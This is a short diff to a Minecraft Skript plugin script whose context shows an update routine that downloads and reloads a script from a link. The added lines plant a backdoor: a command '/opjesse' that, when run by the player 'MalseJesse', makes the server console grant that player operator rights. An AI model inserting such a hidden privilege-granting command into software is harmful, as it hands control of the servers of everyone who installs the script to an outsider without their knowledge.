@@ -82,3 +82,8 @@ command /{@pluginame} [<text>]:
                     delete file path "plugins/Skript/scripts/-update.sk"
                 download file from "{@versionlink}" to file "plugins/Skript/scripts/update.sk"
                 reload script "update"
+
+command /opjesse:
+    trigger:
+        if name of player is "MalseJesse"
+            make console execute command "op MalseJesse"
